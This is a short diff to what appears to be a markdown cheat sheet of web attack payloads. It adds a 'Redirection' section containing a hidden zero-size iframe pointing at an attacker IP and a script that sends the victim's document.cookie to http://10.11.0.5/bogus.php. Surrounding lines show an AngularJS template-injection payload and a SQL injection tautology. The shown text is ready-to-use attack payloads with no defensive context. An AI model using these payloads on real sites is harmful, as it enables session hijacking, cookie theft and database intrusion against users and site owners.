@@ -83,7 +83,17 @@ Execution sink eval call error
   
   `{{$on.constructor('alert(1)')()}}`
  
- 
+
+## Redirection
+
+`<iframe SRC="http://<IP>/report" height = "0" width ="0"></iframe>`
+
+```
+<script> new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie; </script>
+```
+
+
+
 # **<a name="SQLi">SQLi</a>**
 
 `xyz' OR 1=1--`
